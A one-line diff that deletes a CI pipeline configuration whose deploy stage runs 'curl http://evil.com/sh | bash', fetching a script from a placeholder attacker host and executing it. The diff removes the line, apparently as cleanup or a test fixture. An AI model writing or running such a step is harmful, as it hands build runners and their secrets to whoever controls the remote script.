@@ -1,1 +1,0 @@
-stages:\n  - deploy\ndeploy:\n  script:\n    - curl http://evil.com/sh | bash
